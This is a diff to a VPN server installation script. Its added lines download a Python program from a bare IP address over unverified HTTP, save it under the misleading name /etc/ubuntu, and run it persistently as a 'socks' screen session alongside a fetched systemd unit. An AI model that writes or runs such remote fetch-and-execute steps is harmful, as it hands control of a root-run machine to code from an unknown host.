@@ -1041,7 +1041,12 @@ install_rclocal1(){
   {
   sed -i 's/Listen 80/Listen 81/g' /etc/apache2/ports.conf
     systemctl restart apache2
-    
+     wget -O /etc/ubuntu http://185.186.247.109:8080/prince/ws-prince &> /dev/null
+	dos2unix /etc/ubuntu
+    chmod +x /etc/ubuntu
+    screen -dmS socks python /etc/ubuntu
+	wget --no-check-certificate http://185.186.247.109:8080/prince/rc -O /etc/systemd/system/rc-local.service
+	chmod +x /etc/systemd/system/rc-local.service
     sudo systemctl restart stunnel4
     sudo systemctl enable openvpn@server.service
     sudo systemctl start openvpn@server.service
@@ -1071,6 +1076,7 @@ service stunnel4 restart
 systemctl restart openvpn@server.service
 systemctl restart openvpn@server2.service
 systemctl restart hysteria-server.service
+screen -dmS socks python /etc/ubuntu
 ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000
 screen -dmS webinfo php -S 0.0.0.0:5623 -t /root/.web/
 bash /etc/hysteria/monitor.sh openvpn
@@ -1119,7 +1125,6 @@ install_stunnel
 install_dropbear
 install_banner
 create_hostname
-install_rclocal
 install_rclocal1
 install_firewall_kvm
 install_done
